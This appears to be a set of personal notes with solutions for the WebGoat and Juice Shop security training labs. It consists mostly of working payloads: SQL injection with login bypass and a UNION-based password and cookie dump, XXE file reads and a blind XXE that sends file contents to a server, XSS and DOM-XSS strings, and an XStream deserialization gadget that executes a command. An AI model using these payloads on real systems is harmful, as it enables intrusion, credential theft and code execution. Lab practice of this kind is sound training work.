### SQLi ###  

Basic  
Smith - to show it returns smith's records.    
To show exploit; `1=1` can be any true clause:  

```sql  
Smith' or '1'='1   
```

**Bender Login**  
```sql
bender@juice-sh.op' --  
```
```sql 
[2:19 PM]  
101
101 or 1=1
```  
```sql 
Smith' union select userid,user_name, password,cookie,cookie, cookie,userid from user_system_data --
```  

## XXE ##

Simple:  
```xml 
<?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>  
```

Modern Rest Framework:  
Change content type to: `Content-Type: application/xml` and 
```xml  
<?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><user>  <username>&root;</username><password>test</password></user>
```  

Blind SendFile   
```xml
  
      Solution:
     
      Create DTD:
     
      <pre>
          <?xml version="1.0" encoding="UTF-8"?>
          <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
          <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
           %all;
      </pre>
     
      This will be reduced to:
     
      <pre>
          <!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=[contents_file]'>
      </pre>
     
      Wire it all up in the xml send to the server:
     
      <pre>
       <?xml version="1.0"?>
       <!DOCTYPE root [
       <!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/XXE/test.dtd">
       %remote;
        ]>
       <user>
         <username>test&send;</username>
       </user>
     
      </pre>
     
     
```

### XSS ###
```javascript
<script>alert('my javascript here')</script>4128 3214 0002 1999
``` 

DOM-XSS:  

  Something like 
  `http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E
//`   
OR  
`http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&_someVar=234902384lotslsfjdOf9889080GarbageHere<script>webgoat.customjs.phoneHome();<%2Fscript>`  

### Vuln - Components ###

Jquery page: - it is contrived; but paste that in each box  
```javascript
OK<script>alert("XSS")<\/script>
OK<script>alert("XSS")<\/script>
```
for the deserialization:  got to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/  to read about why it works so you can talk to it.
```html  
<sorted-set>  
 <string>foo</string>
 <dynamic-proxy>
   <interface>java.lang.Comparable</interface>
   <handler class="java.beans.EventHandler">
     <target class="java.lang.ProcessBuilder">
       <command>
         <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
       </command>
     </target>
     <action>start</action>
   </handler>
 </dynamic-proxy>
</sorted-set>

```
